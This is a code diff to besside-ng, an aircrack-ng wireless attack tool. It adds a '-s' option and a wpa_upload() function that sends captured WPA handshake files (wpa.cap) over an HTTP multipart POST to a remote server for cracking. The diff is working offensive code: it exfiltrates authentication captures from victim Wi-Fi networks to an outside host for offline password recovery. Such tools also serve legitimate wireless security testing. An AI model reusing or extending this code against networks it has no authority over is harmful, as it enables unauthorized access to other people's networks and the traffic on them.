@@ -30,9 +30,14 @@
  *  files in the program, then also delete it here.
  */
 
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
 #include <sys/select.h>
 #include <sys/types.h>
 #include <sys/wait.h>
+#include <sys/time.h>
+#include <sys/stat.h>
 #include <fcntl.h>
 #include <stdio.h>
 #include <stdlib.h>
@@ -43,8 +48,8 @@
 #include <assert.h>
 #include <time.h>
 #include <stdarg.h>
-#include <sys/time.h>
 #include <errno.h>
+#include <netdb.h>
 
 #include "aircrack-ng.h"
 #include "version.h"
@@ -138,6 +143,7 @@ struct conf {
 	char		*cf_log;
 	int		cf_do_wep;
 	int		cf_do_wpa;
+	char		*cf_wpa_server;
 } _conf;
 
 struct timer {
@@ -657,7 +663,7 @@ static int open_pcap(char *fname)
 	int fd;
         struct pcap_file_header pfh;
 
-	fd = open(fname, O_WRONLY | O_APPEND);
+	fd = open(fname, O_RDWR | O_APPEND);
 	if (fd != -1) {
 		time_printf(V_NORMAL, "Appending to %s\n", fname);
 		return fd;
@@ -705,6 +711,147 @@ static void packet_write_pcap(int fd, struct packet *p)
 	write_pcap(fd, p->p_data, p->p_len);
 }
 
+static void wpa_upload(void)
+{
+	struct sockaddr_in s_in;
+	int s;
+	char buf[4096];
+	char boundary[128];
+	char h1[1024];
+	char form[1024];
+	struct stat stat;
+	off_t off;
+	int tot;
+	int ok = 0;
+
+	memset(&s_in, 0, sizeof(s_in));
+
+	s_in.sin_family = PF_INET;
+	s_in.sin_port   = htons(80);
+
+	if (inet_aton(_conf.cf_wpa_server, &s_in.sin_addr) == 0) {
+		struct hostent *he;
+
+		he = gethostbyname(_conf.cf_wpa_server);
+		if (!he)
+			goto __no_resolve;
+
+		if (!he->h_addr_list[0]) {
+__no_resolve:
+			time_printf(V_NORMAL, "Can't resolve %s\n",
+				    _conf.cf_wpa_server);
+			return;
+		}
+
+		memcpy(&s_in.sin_addr, he->h_addr_list[0], 4);
+	}
+
+	if ((s = socket(s_in.sin_family, SOCK_STREAM, 0)) == -1)
+		err(1, "socket()");
+
+	if (connect(s, (struct sockaddr*) &s_in, sizeof(s_in)) == -1) {
+		time_printf(V_NORMAL, "Can't connect to %s\n",
+			    _conf.cf_wpa_server);
+
+		close(s);
+		return;
+	}
+
+	if (fstat(_state.s_wpafd, &stat) == -1)
+		err(1, "fstat()");
+
+	snprintf(boundary, sizeof(boundary),
+		 "37872861916401860062104501923");
+
+	snprintf(h1, sizeof(h1),
+		 "--%s\r\n"
+		 "Content-Disposition: form-data;"
+			 " name=\"file\";"
+			 " filename=\"wpa.cap\"\r\n"
+		 "Content-Type: application/octet-stream\r\n\r\n", boundary);
+
+	snprintf(form, sizeof(form),
+		 "\r\n"
+		 "--%s\r\n"
+		 "Content-Disposition: form-data;"
+		 " name=\"fs\"\r\n\r\n"
+		 "Upload"
+		 "\r\n"
+		 "%s--\r\n", boundary, boundary);
+
+	tot = stat.st_size;
+
+	snprintf(buf, sizeof(buf),
+		"POST /index.php HTTP/1.0\r\n"
+		"Host: %s\r\n"
+		"User-Agent: besside-ng\r\n"
+		"Content-Type: multipart/form-data; boundary=%s\r\n"
+		"Content-Length: %d\r\n\r\n",
+		_conf.cf_wpa_server,
+		boundary,
+		strlen(h1) + strlen(form) + tot);
+
+	if (write(s, buf, strlen(buf)) != (int) strlen(buf))
+		goto __fail;
+
+	if (write(s, h1, strlen(h1)) != (int) strlen(h1))
+		goto __fail;
+
+	if ((off = lseek(_state.s_wpafd, 0, SEEK_CUR)) == (off_t) -1)
+		err(1, "lseek()");
+
+	while (tot) {
+		int l = tot;
+
+		if (l > (int) sizeof(buf))
+			l = sizeof(buf);
+
+		if (read(_state.s_wpafd, buf, l) != l)
+			err(1, "read()");
+
+		if (write(s, buf, l) != l)
+			goto __fail;
+
+		tot -= l;
+	}
+
+	if (write(s, form, strlen(form)) != (int) strlen(form))
+		goto __fail;
+
+	if (lseek(_state.s_wpafd, off, SEEK_SET) == (off_t) -1)
+		err(1, "lseek()");
+
+	while ((tot = read(s, buf, sizeof(buf) - 1)) > 0) {
+		char *p;
+		
+		buf[tot] = 0;
+
+		p = strstr(buf, "\r\n\r\n");
+		if (!p)
+			goto __fail;
+
+		p += 4;
+
+		if (atoi(p) == 2)
+			ok = 1;
+		else
+			goto __fail;
+	}
+
+	if (!ok)	
+		goto __fail;
+
+	close(s);
+
+	time_printf(V_NORMAL, "Uploaded WPA handshake to %s\n",
+		    _conf.cf_wpa_server);
+
+	return;
+__fail:
+	close(s);
+	time_printf(V_NORMAL, "WPA handshake upload failed\n");
+}
+
 static void wpa_crack(struct network *n)
 {
 	int i;
@@ -720,7 +867,12 @@ static void wpa_crack(struct network *n)
 
 	fsync(_state.s_wpafd);
 
-	time_printf(V_NORMAL, "Run aircrack on %s for WPA key\n", _conf.cf_wpa);
+	if (_conf.cf_wpa_server)
+		wpa_upload();
+	else {
+		time_printf(V_NORMAL, "Run aircrack on %s for WPA key\n",
+			    _conf.cf_wpa);
+	}
 
 	/* that was fast cracking! */
 	n->n_astate = ASTATE_DONE;
@@ -2464,6 +2616,7 @@ static void usage(char *prog)
                 "  Options:\n"
                 "\n"
                 "       -b <victim mac> : Victim BSSID\n"
+		"       -s <WPA server> : Upload wpa.cap for cracking\n"
 		"       -W              : WPA only\n"
                 "       -v              : verbose, -vv for more, etc.\n"
                 "       -h              : This help screen\n"
@@ -2480,8 +2633,12 @@ int main(int argc, char *argv[])
 
 	init_conf();
 
-	while ((ch = getopt(argc, argv, "hb:vW")) != -1) {
+	while ((ch = getopt(argc, argv, "hb:vWs:")) != -1) {
 		switch (ch) {
+		case 's':
+			_conf.cf_wpa_server = optarg;
+			break;
+
 		case 'W':
 			_conf.cf_do_wep = 0;
 			break;
